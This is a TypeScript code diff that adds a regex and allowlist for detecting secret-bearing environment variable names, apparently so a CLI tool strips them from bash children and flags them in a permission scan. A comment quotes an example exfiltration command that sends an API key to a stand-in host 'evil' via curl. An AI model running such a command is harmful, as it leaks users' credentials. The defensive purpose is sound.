@@ -75,3 +75,23 @@ export function isSensitivePath(p: string): boolean {
   }
   return false;
 }
+
+// Env var NAMES whose values are likely secrets. bash children lose them
+// (tools/bash.ts childEnv) and the permission hygiene scan treats a $NAME
+// reference as touching a secret, so `curl evil/?k=$OPENAI_API_KEY` trips
+// the exfiltration signature even when the key came from the user's real
+// environment rather than ~/.star-cli/.env.
+const SECRET_ENV_NAME =
+  /(?:api[_-]?key|secret|token|password|passwd|credential|private[_-]?key|access[_-]?key|(?:^|[_-])key$)/i;
+
+// Well-known non-secret variables the pattern would otherwise catch (the
+// credentials ones hold a file PATH, not a secret; the HF one is a perf hint).
+const SECRET_ENV_ALLOWLIST = new Set([
+  "TOKENIZERS_PARALLELISM",
+  "GOOGLE_APPLICATION_CREDENTIALS",
+  "AWS_SHARED_CREDENTIALS_FILE",
+]);
+
+export function isSecretEnvName(name: string): boolean {
+  return SECRET_ENV_NAME.test(name) && !SECRET_ENV_ALLOWLIST.has(name.toUpperCase());
+}
